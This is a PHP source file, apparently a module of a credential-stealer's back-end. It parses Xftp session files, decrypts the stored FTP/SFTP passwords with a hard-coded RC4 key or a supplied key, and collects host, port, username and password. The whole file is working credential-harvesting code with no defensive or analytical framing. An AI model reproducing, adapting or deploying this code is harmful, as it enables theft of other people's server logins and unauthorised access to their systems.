<?php

	class Module_xftp extends Module_
	{
		private function decryptV5P($password, $key)
		{
			$decoded_password = base64_decode($password, true);
			if (!strlen($decoded_password))
				return '';
			
			$decoded_password = substr($decoded_password, 0, strlen($decoded_password) - 32);
			
			return rc4Decrypt(hash('sha256', $key, true), $decoded_password);
		}
			
		private function decrypt($password)
		{
			$decoded_password = base64_decode($password, true);
			if (!strlen($decoded_password))
				return '';

			return rc4Decrypt(hash('md5', '!X@s#c$e%l^l&', true), $decoded_password);
		}
		
		function ProcessFile($Source)
		{
			$INI_ = parse_ini($Source);
			if(!$INI_)
				return NULL;
			
			$User = Assign_($INI_['Connection']['UserName']);
			$Pass = Assign_($INI_['Connection']['Password']);
			$Host = Assign_($INI_['Connection']['Host']);
			$Port = Assign_($INI_['Connection']['Port']);
			$Prot = Assign_($INI_['Connection']['Protocol']);
			
			$Key = $this->get_options("Key");
			if($Key != NULL && isset($INI_['SessionInfo']['Version']) && trim($INI_['SessionInfo']['Version']) > 5.0)
			{
				$Pass = $this->decryptV5P($Pass, $Key);
			}
			else
				$Pass = $this->decrypt($Pass);
			
			$this->add_ftp($this->append_port($this->ftp_force_ssh($Host, $Prot == '1'), $Port), $User, $Pass);
			
			$INI_ = NULL;
		}
		protected function SetKey($Data)
		{
			$this->set_options("Key", trim($Data));
		}
		public function process_module($Data, $Version)
		{
			switch ($Version)
			{
				case 0:
					$this->ProcessFile($Data);
					break;
				case 1:
					$this->SetKey($Data);
					break;
				default:
					return FALSE;
			}
			
			return TRUE;
		}
	}